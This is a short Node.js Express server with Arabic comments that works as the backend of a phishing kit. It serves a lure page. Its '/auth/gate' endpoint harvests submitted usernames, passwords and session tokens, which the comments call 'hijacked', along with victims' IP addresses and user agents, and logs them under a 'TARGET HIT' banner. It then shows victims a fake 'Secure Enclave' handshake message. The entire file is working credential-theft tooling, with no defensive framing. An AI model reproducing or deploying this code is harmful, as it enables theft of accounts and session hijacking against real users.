const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

// عرض الصفحة الرئيسية (تأكد أن ملف index.html في نفس المجلد)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال البيانات والتوكنات المخطوفة
app.post('/auth/gate', (req, res) => {
    const { u, p, sid } = req.body;
    
    // سحب بصمة الجهاز والموقع من خلال النفق
    const ip = req.headers['x-forwarded-for'] || "Hidden via Tunnel";
    const userAgent = req.headers['user-agent'];

    console.log("------------------------------------");
    console.log("🎯 TARGET HIT VIA TUNNEL 🎯");
    console.log("ID: " + u);
    console.log("PW: " + p);
    console.log("SESSION_ID (B64): " + sid); 
    console.log("USER_AGENT: " + userAgent);
    console.log("IP_REF: " + ip);
    console.log("------------------------------------");

    res.send('<div style="text-align:center; padding-top:100px; font-family:sans-serif;"><h2>Connecting to Secure Enclave...</h2><p>Device handshake in progress. Do not refresh.</p></div>');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Bypass Engine Ready on Port ' + PORT));
